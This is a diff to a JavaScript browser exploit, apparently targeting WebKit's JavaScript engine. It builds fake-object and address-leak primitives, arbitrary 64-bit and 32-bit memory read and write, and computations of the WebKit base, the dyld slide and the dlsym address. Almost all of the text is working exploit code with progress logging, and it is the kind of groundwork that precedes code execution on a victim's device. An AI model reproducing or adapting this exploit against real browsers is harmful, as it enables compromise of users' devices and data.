@@ -141,11 +141,12 @@ function pwn() {
         return structureID;
     }
     
+    // leak structureID
     let noCoW = 13.37;
     var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
     let structureID = LeakStructureID(arrLeak);
     log(`[+] leak structureID: 0x${structureID.toString(16)}`);
-    pad = [{}, {}, {}];
+    // create a fake object with victim as it's butterfly
     var victim = [noCoW, 14.47, 15.57];
     victim['prop'] = 13.37;
     victim['prop_1'] = 13.37;
@@ -155,15 +156,18 @@ function pwn() {
         cellHeader: f64[0],
         butterfly: victim
     };
-    var containerAddr = addrof_pre(container);
-    var fakeArrAddr = containerAddr + 0x10;
-    var driver = fakeobj_pre(fakeArrAddr);
+    var driver = fakeobj_pre(addrof_pre(container) + 0x10);
     var unboxed = [noCoW, 13.37, 13.37];
     var boxed = [{}];
+    // set victim butterfly to unboxed
     driver[1] = unboxed;
+    // get unboxed butterfly
     var sharedButterfly = victim[1];
+    // set victim butterfly to boxed
     driver[1] = boxed;
+    // set boxed butterfly to unboxed butterfly
     victim[1] = sharedButterfly;
+    // set new cellHeader
     u32[0] = structureID;
     u32[1] = 0x01082307-0x20000;
     container.cellHeader = f64[0];
@@ -185,30 +189,12 @@ function pwn() {
         victim.prop = i2f(val);
     }
     
-    // example read32 using Uint32Array for float to integer conversion
     let buffer = new Uint32Array(2);
     buffer.fill(0x41414141);
     let addr = addrof(buffer);
     log(`[+] addr: 0x${addr.toString(16)}`);
     let bytes_addr = read64(addr + 0x10);
     log(`[+] bytes_addr: 0x${bytes_addr.toString(16)}`);
-    
-//    function read32_poc(addr) {
-//        driver[1] = i2f(addr + 0x10);
-//        boxed[0] = victim.prop;
-//        let value = unboxed[0];
-//        driver[1] = i2f(bytes_addr + 0x10);
-//        victim.prop = value;
-//        return buffer[0];
-//    }
-//    function write32_poc(addr, val) {
-//        buffer[0] = val;
-//        driver[1] = i2f(bytes_addr + 0x10);
-//        boxed[0] = victim.prop;
-//        let value = unboxed[0];
-//        driver[1] = i2f(addr + 0x10);
-//        victim.prop = value;
-//    }
     
     log(`[+] read64 -> 0x${read64(bytes_addr).toString(16)}`);
     write64(bytes_addr, 0x42424242);
@@ -220,7 +206,34 @@ function pwn() {
     let webkit_base = vtable_addr - 0x2ce4dd1;
     log(`[+] WebKit base address: 0x${webkit_base.toString(16)}`);
     log(`[+] read64 -> 0x${read64(webkit_base).toString(16)}`);
-//    log(`[+] read32_poc -> 0x${read32_poc(webkit_base).toString(16)}`);
-//    write32_poc(bytes_addr + 4, 0x41424344);
-//    log(`[+] read32_poc -> 0x${read32_poc(bytes_addr + 4).toString(16)}`);
+    let dyld_slide = webkit_base - 0x18C0D0000;
+    log(`[+] dyld_slide: 0x${dyld_slide.toString(16)}`);
+    let dlsym_addr = 0x1800c96e4 + dyld_slide;
+    log(`[+] dlsym_addr: 0x${dlsym_addr.toString(16)}`);
+    log(`[+] read64 -> 0x${read64(dlsym_addr).toString(16)}`);
+  
+    
+    let noCoW1 = 1337;
+    var u32_array = [noCoW1,1,2,3,4];
+    boxed[0] = u32_array;
+    driver[1] = unboxed[0];
+    victim[1] = sharedButterfly;
+
+    buffer[0] = 0x41424344;
+    buffer[1] = 0xffffffff;
+
+    driver[1] = i2f(bytes_addr + 0x10);
+    boxed[0] = victim.prop;
+    u32[0] = u32_array[0];
+    log(`[+] read32(bytes_addr) -> 0x${u32[0].toString(16)}`);
+    
+    driver[1] = i2f((bytes_addr + 0x4) + 0x10);
+    boxed[0] = victim.prop;
+    u32[0] = u32_array[0];
+    log(`[+] read32(bytes_addr + 0x4) -> 0x${u32[0].toString(16)}`);
+    
+    driver[1] = i2f(webkit_base + 0x10);
+    boxed[0] = victim.prop;
+    u32[0] = u32_array[0];
+    log(`[+] read32(webkit_base) -> 0x${u32[0].toString(16)}`);
 }
